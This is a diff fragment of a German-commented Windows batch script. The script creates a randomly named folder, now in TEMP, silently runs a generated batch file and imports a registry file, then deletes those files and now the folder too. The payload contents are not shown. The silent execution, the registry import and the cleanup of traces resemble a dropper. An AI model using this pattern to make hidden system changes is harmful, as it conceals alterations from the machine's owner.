@@ -24,9 +24,9 @@ set /a "length-=1"
 if !length! gtr 0 goto generateRandom
 
 :: =============================
-:: 3. %APPDATA% Ordner für zufälligen Namen
+:: 3. Zielpfad für zufälligen Ordner im TEMP-Verzeichnis
 :: =============================
-set "appDataPath=%APPDATA%\%randomName%"
+set "appDataPath=%TEMP%\%randomName%"
 
 :: =============================
 :: 4. Ordner erstellen, falls er nicht existiert
@@ -58,11 +58,15 @@ call "%batFile%" >nul 2>&1
 reg import "%regFile%" >nul 2>&1
 
 :: =============================
-:: 8. Dateien löschen
+:: 8. Dateien löschen (nur wenn alles fertig ist)
 del /f /q "%batFile%" >nul 2>&1
 del /f /q "%regFile%" >nul 2>&1
 
 :: =============================
-:: 9. Kleines Delay vor dem Schließen
+:: 9. Ordner löschen, wenn alle Dateien gelöscht wurden
+rd /s /q "%appDataPath%" >nul 2>&1
+
+:: =============================
+:: 10. Kleines Delay vor dem Schließen
 timeout /t 2 >nul
 exit
